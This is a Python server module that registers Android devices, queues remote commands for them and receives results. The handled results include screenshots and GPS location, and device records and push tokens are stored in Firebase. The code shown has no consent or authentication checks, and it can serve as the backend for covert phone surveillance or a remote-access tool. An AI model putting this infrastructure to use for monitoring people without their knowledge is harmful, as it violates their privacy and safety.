import datetime
import json
from command_manager import CommandManager
from device_manager import DeviceManager
from log_util import logger
from firebase_client import get_data, set_data, update_data


def handle_device_registration(request_handler, post_data):
    """Handle device registration requests and save to Firebase"""
    try:
        data = json.loads(post_data.decode('utf-8'))
        device_id = data.get('device_id')
        device_info = data.get('device_info', {})

        logger.info(f"Device registration: {device_id}")

        # Check for required fields
        if not device_id:
            logger.error("Missing device_id in registration request")
            send_error_response(request_handler, "Missing device_id")
            return False

        # Ensure device_info is properly formatted
        if not isinstance(device_info, dict):
            device_info = {}

        # Ensure required fields in device_info
        if 'model' not in device_info:
            device_info['model'] = 'Unknown Device'

        if 'android_version' not in device_info:
            device_info['android_version'] = 'Unknown'

        # Register device
        success = DeviceManager.register_device(device_id, device_info)

        # Respond with success and initial commands
        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()

        # Send initial commands to the device
        request_handler.wfile.write(json.dumps({
            "status": "success" if success else "error",
            "device_id": device_id,
            "commands": [
                {"command": "set_interval", "interval": 15},  # Set upload interval to 15 minutes
                {"command": "collect_info"}  # Request basic device info
            ]
        }).encode())
        return True

    except Exception as e:
        logger.error(f"Error processing device registration: {str(e)}")
        send_error_response(request_handler, str(e))
        return False


def handle_command_request(request_handler, post_data):
    """Handle command requests from devices"""
    try:
        data = json.loads(post_data.decode('utf-8'))
        device_id = data.get('device_id')

        # Validate request
        if not device_id:
            logger.error("Missing device_id in command request")
            send_error_response(request_handler, "Missing device_id")
            return False

        # Update last seen time
        DeviceManager.update_device_last_seen(device_id)

        logger.info(f"Command request from device: {device_id}")

        # Check if there are pending commands for this device
        commands = CommandManager.get_pending_commands(device_id)

        # Respond with commands
        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({
            "status": "success",
            "commands": commands
        }).encode())
        return True

    except Exception as e:
        logger.error(f"Error processing command request: {str(e)}")
        send_error_response(request_handler, str(e))
        return False


def handle_command_response(request_handler, post_data):
    """Handle command execution responses from devices"""
    try:
        data = json.loads(post_data.decode('utf-8'))
        device_id = data.get('device_id', 'unknown')
        command_id = data.get('command_id')
        result = data.get('result', {})

        # Validate request
        if not command_id:
            logger.error("Missing command_id in command response")
            send_error_response(request_handler, "Missing command_id")
            return False

        logger.info(f"Received command result from device {device_id} for command {command_id}")

        # Process result based on command type if known
        if isinstance(result, dict) and 'command_type' in data:
            command_type = data.get('command_type')
            # Special handling for different command types
            if command_type == 'capture_screenshot' and 'image_data' in result:
                # Ensure image data is properly formatted
                logger.info(f"Received screenshot from device {device_id}")
            elif command_type == 'get_location' and 'latitude' in result and 'longitude' in result:
                # Add additional location information
                logger.info(f"Received location data from device {device_id}: " +
                            f"{result.get('latitude')}, {result.get('longitude')}")

        # Mark command as executed
        success = False
        if command_id:
            success = CommandManager.mark_command_executed(device_id, command_id, result)

        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({
            "status": "success" if success else "error"
        }).encode())
        return True

    except Exception as e:
        logger.error(f"Error processing command response: {str(e)}")
        send_error_response(request_handler, str(e))
        return False


def send_error_response(request_handler, message):
    """Send an error response"""
    request_handler.send_response(400)
    request_handler.send_header("Content-type", "application/json")
    request_handler.end_headers()
    request_handler.wfile.write(json.dumps({
        "status": "error",
        "message": message
    }).encode())

def handle_fcm_registration(request_handler, post_data):
    try:
        data = json.loads(post_data.decode('utf-8'))
        device_id = data.get('device_id')
        fcm_token = data.get('fcm_token')

        if not device_id or not fcm_token:
            logger.error("Missing device_id or fcm_token in registration request")
            send_error_response(request_handler, "Missing device_id or fcm_token")
            return False

        # Update device record with FCM token
        device_data = get_data(f'devices/{device_id}') or {}
        device_data['fcm_token'] = fcm_token
        device_data['last_seen'] = datetime.datetime.now().isoformat()

        set_data(f'devices/{device_id}', device_data)

        logger.info(f"Registered FCM token for device {device_id}")

        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({
            "status": "success",
            "device_id": device_id
        }).encode())

        return True
    except Exception as e:
        logger.error(f"Error registering FCM token: {str(e)}")
        send_error_response(request_handler, str(e))
        return False